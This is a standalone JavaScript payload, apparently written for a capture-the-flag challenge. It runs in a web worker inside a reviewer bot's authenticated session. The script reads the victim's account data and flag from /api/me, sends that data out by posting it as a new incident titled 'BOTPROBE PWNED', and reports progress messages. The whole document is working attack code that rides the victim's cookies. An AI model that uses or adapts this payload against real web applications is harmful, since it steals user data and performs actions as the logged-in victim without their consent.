(async () => {
    const origin = self.location.origin;

    try {
        // Read the authenticated reviewer's account
        const response = await fetch(origin + "/api/me", {
            credentials: "include"
        });

        const data = await response.json();
        const user = data.user || {};

        const summary = {
            id: user.id,
            role: user.role,
            verified: user.verified,
            keys: Object.keys(user),
            flag: user.flag || null
        };

        // Leave a visible result in the application's incident list
        const title = user.flag
            ? "BOTPROBE PWNED: " + user.flag
            : "BOTPROBE: " + JSON.stringify(summary);

        const result = await fetch(origin + "/api/incidents", {
            method: "POST",
            credentials: "include",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                title: title.slice(0, 240),
                facility: "Meridian-2",
                severity: "Watch"
            })
        });

        self.postMessage({
            type: "progress",
            message: "BOT SESSION: " + JSON.stringify(summary)
        });

        self.postMessage({
            type: "progress",
            message: "INCIDENT RESULT: " + result.status
        });

    } catch (error) {
        self.postMessage({
            type: "progress",
            message: "ERROR: " + error.message
        });
    }
})();
